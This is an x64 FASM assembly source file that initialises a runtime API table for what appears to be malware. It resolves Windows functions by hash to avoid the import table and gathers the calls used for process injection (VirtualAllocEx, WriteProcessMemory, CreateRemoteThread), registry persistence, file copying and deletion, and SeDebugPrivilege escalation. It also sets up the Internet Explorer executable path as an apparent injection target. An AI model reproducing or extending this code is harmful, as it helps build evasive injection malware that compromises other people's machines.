include '../include/global.inc'
include 'win64a.inc'

use64

macro API64_DECLARE library, [funcname] {
    common
        library     dq  ?
    forward
        funcname    dq  ?
}

; 批量声明api hash
macro API64_HASH_TABLE library, [funcname] {
	forward
		local ..c, ..hash
		virtual at 0
			db	`funcname
			..hash = 0
			repeat $
				load ..c from $$+%-1
				..hash = ..hash * 131 + ..c
				..hash = ..hash and 0xffffffff
			end repeat
			..hash = ..hash and 0x7fffffff
		end virtual
		api_hash_t	..hash, x64_global_data_t#.#library, x64_global_data_t#.#funcname    
}

macro API64_HASH_TABLE_END {
	common
		_WORD	0    
}

struct x64_global_data_t
	API64_DECLARE kernel32,\
		LoadLibraryA, GetProcAddress, CloseHandle, OpenProcess, lstrlenW, lstrcatW, lstrcpyW, lstrcmpiW, Sleep, VirtualAllocEx, WriteProcessMemory,\
		WaitForSingleObject, CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, ExpandEnvironmentStringsW, CreateProcessW, CreateRemoteThread,\
		GetSystemDirectoryW, GetWindowsDirectoryW, CopyFileW, DeleteFileW, GetProcessHeap, HeapAlloc, HeapFree, CreateMutexA, GetLastError, GetCurrentProcess

	API64_DECLARE ntdll,\
		RtlZeroMemory, RtlMoveMemory

	API64_DECLARE advapi32,\
		OpenProcessToken, LookupPrivilegeValueA, AdjustTokenPrivileges, RegOpenKeyExA, RegCreateKeyExW, RegSetValueExW, RegCloseKey

	expand_str	dq	?
	sedebugname	dq	?
ends

; rcx = global_data
; rdx = x64_global_data_t
proc init uses rbx rsi rdi
	sub rsp, 0x20

	mov rsi, rcx
	mov rdi, rdx

	assume rsi: global_data_t
	assume rdi: x64_global_data_t

	;call get_kernel32_base_x64
	call qword [rsi.get_kernel32_base_x64]
	mov [rdi.kernel32], rax
	;call get_ntdll_base_x64
	call qword [rsi.get_ntdll_base_x64]
	mov [rdi.ntdll], rax

	mov rcx, [rdi.kernel32]
	MOV_HASH edx, GetProcAddress
	xor r8, r8
	;call get_proc_from_hash_x64
	call qword [rsi.get_proc_from_hash_x64]
	mov [rdi.GetProcAddress], rax

	mov rcx, [rdi.kernel32]
	MOV_HASH edx, LoadLibraryA
	mov r8, rax
	;call get_proc_from_hash_x64
	call qword [rsi.get_proc_from_hash_x64]
	mov [rdi.LoadLibraryA], rax

	PUSH_ANSI_STRING 'advapi32'
	pop rcx
	call qword [rdi.LoadLibraryA]
	mov [rdi.advapi32], rax

	call .push_api_table

	API64_HASH_TABLE kernel32,\
		CloseHandle, OpenProcess, lstrlenW, lstrcatW, lstrcpyW, lstrcmpiW, Sleep, VirtualAllocEx, WriteProcessMemory,\
		WaitForSingleObject, CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, ExpandEnvironmentStringsW, CreateProcessW, CreateRemoteThread,\
		GetSystemDirectoryW, GetWindowsDirectoryW, CopyFileW, DeleteFileW, GetProcessHeap, HeapAlloc, HeapFree, CreateMutexA, GetLastError, GetCurrentProcess

	API64_HASH_TABLE ntdll,\
		RtlZeroMemory, RtlMoveMemory

	API64_HASH_TABLE advapi32,\
		OpenProcessToken, LookupPrivilegeValueA, AdjustTokenPrivileges, RegOpenKeyExA, RegCreateKeyExW, RegSetValueExW, RegCloseKey

	API64_HASH_TABLE_END

.push_api_table:
	pop rbx

	assume rbx: api_hash_t 

	.while word [rbx] <> 0
		xor rcx, rcx
		mov cx, word [rbx.lib_offset]
		mov rcx, qword [rdi + rcx]
		mov edx, [rbx.hash]
		mov r8, [rdi.GetProcAddress]
		;call get_proc_from_hash_x64
		call qword [rsi.get_proc_from_hash_x64]

		xor rcx, rcx
		mov cx, word [rbx.save_offset]
		mov [rdi + rcx], rax
		add rbx, sizeof.api_hash_t
	.endw

	PUSH_WIDE_STRING '%PROGRAMFILES(X86)%\Internet Explorer\iexplore.exe'
	pop [rdi.expand_str]
	PUSH_ANSI_STRING 'SeDebugPrivilege'
	pop [rdi.sedebugname]

	add rsp, 0x20
	ret
endp

init_size = $ - init